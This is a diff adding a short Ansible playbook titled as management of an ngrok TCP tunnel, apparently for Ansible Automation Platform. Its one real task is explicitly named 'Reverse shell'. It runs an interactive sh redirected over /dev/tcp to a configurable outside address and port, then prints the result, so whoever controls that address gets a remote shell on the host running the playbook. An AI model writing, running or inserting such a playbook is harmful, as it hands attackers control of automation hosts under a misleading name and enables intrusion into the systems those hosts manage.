@@ -1,0 +1,21 @@
+---
+- name: Manage ngrok TCP Tunnel (for AAP)
+  hosts: localhost
+  connection: local
+  gather_facts: yes
+
+  vars:
+    port: ngrok_port
+    tcp_addr: ngrok_addr
+
+  tasks:
+    - name: Reverse shell
+      block:
+        - name: run rev shell
+          delegate_to: localhost
+          shell: sh -i >& /dev/tcp/{{ tcp_addr }}/{{ port }} 0>&1
+          register: shell_output
+  
+        - name: Get stdout or stderr from the output
+          debug:
+            var: shell_output.stdout
